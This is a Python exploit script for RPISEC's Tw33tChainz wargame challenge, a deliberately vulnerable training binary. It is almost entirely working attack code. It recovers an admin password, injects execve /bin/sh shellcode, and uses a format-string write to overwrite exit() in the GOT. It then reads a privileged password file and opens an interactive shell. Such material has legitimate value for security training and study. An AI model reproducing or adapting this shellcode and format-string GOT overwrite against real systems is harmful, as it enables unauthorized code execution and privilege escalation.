#!/usr/bin/python
# coding: utf-8


# sylv3st3r : Exploit for RPISEC's Tw33tChainz challenge
# Author : Ivan 'evilgroot' Luengo
# Email  : evilgroot@gmail.com


import struct
import subprocess
import sys
import time
import threading


##################
#  Global stuff  #
##################

instream = None
outstream = None

# ********* IMPORTANT **********
# The following depend on static values in the binary. It shouldn't change for
# the same binary file (the one available in the warzone). However, if yours
# was compiled differently, there is a chance that the shellcode won't work
# since relies in a static pointer to /bin/sh at 0xb7f83a24 and exit() being at
# offset 0x0804d03c in the GOT. You can manually fix the inconsistencies here.
binsh = 0xb7f83a24  # Pointer to /bin/sh
exitgot = 0x0804d03c  # Offset of exit() in the GOT

shellcode = '\x31\xC9\xF7\xE1\xBB%s\xB0\x0B\xCD\x80' % struct.pack('<I', binsh)


###############
#  Functions  #
###############


def recoverpass(s):
    '''
    Recovers the secret password from the one printed out by Tw33tChainz's
    print_pass().
    '''
    gen = ''
    for elm in (s[:8], s[8:16], s[16:24], s[24:]):
        gen += struct.pack('<I', int(elm, 16))
    return gen


def dotweet(t):
    '''
    Writes a tweet.
    '''
    instream.write('1\n')
    instream.write('%s\n' % t)
    if len(t) < 15:  # Skip "replace \n" message
        instream.write('\n')


def handleoutput(out, stuff, stage1, stage2, stage3, stage4):
    '''
    This function will work as a separate thread, reading Tw33tChainz's
    output and parsing relevant information. It will also notify the
    main() thread when a stage is completed.
    '''
    while True:
        line = outstream.readline()
        if line:
            if not stage1.is_set():
                if line.find('Generated Password:') >= 0:
                    stuff['gen'] = outstream.readline().strip()
                    stage1.set()
            elif not stage2.is_set():
                if line.find('Authenticated!') >= 0:
                    stage2.set()
            elif not stage3.is_set():
                if line.find('Address:') >= 0:
                    stuff['shell'] = int(line.split()[-1], 16)
                    stage3.set()
            elif not stage4.is_set():
                if line.find('flag') >= 0:
                    stuff['flag'] = line.split()[-1]
                    stage4.set()
                    continue  # Don't print the flag twice

            if out or stage4.is_set():
                print line,


def overwritegot(shell):
    '''
    Crafts the malicious tweets required to overwrite the GOT successfuly.
    '''
    global exitgot
    f = 'A%s%%%dx%%8$hnn'
    for i in xrange(4):
        t = f % (struct.pack('<I', exitgot+i), ((shell >> 8*i) & 0xff)+251)
        dotweet(t)


if __name__ == '__main__':

    o = True
    path = '/levels/project1/tw33tchainz'
    for arg in sys.argv[1:]:
        if arg in ['-h', '--help']:
            print 'usage: python %s [tw33tchainz path] [-q]' % sys.argv[0]
            print '-q   - Don\'t show Tw33tChainz\'s output'
            print 'default path: /levels/project1/tw33tchainz'
        elif arg == '-q':
            o = False
        else:
            path = arg

    print '======================================'
    print '  sylv3st3r exploit for Tw33tChainz'
    print '===== press ENTER to kill Tweety ====='
    raw_input('')

    tw33t = subprocess.Popen(path, stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE)

    print '[+] Tw33tChainz running (pid %d)' % tw33t.pid

    instream = tw33t.stdin
    outstream = tw33t.stdout
    secretpass = ''
    stuff = {'gen': '', 'shell': None, 'flag': ''}
    stage1 = threading.Event()
    stage2 = threading.Event()
    stage3 = threading.Event()
    stage4 = threading.Event()

    reader = threading.Thread(target=handleoutput,
                              args=(o, stuff, stage1, stage2, stage3, stage4))
    reader.daemon = True
    reader.start()

    try:
        # STAGE 1 : log in and read generated password
        user = '\x00' * 15
        salt = '\x00' * 15
        instream.write(user+salt+'\n')
        stage1.wait()
        print '[+] STAGE1 completed: Gen. Password [%s]' % stuff['gen']

        # STAGE 2 : Crack admin password and log in
        secretpass = recoverpass(stuff['gen'])
        instream.write('3\n')
        instream.write(secretpass+'\n')
        instream.write('\n')
        stage2.wait(timeout=5)
        if stage2.is_set():
            print '[+] STAGE2 completed: Authenticated as admin'
        else:
            print '[FATAL]: Admin login failed :( run sylv3st3r again'
            sys.exit(1)

        # STAGE 3 : Inject shellcode and retreive it's address
        instream.write('6\n')
        instream.write('\n')
        dotweet(shellcode)
        instream.write('2\n')
        instream.write('\n')
        stage3.wait(timeout=5)
        print '[+] STAGE3 completed: shellcode is at 0x%08x' % stuff['shell']

        overwritegot(stuff['shell'])
        instream.write('5\n')
        instream.write('\n')
        print
        instream.write('echo "flag : $(cat /home/project1_priv/.pass)"\n')
        time.sleep(0.05)
        stage4.wait()
        print '[+] STAGE4 completed: no more "suffering succotash"'
        print '[+] flag : %s' % stuff['flag']
        print '[+] Enjoy your shell, use Ctrl-C to leave'

        while True:
            instream.write(raw_input('(shell) ')+'\n')
            time.sleep(0.05)  # Give a chance to outputhandler

    except KeyboardInterrupt:
        print '\n[+] Ctrl-C requested, shutting down...'
    finally:
        pass
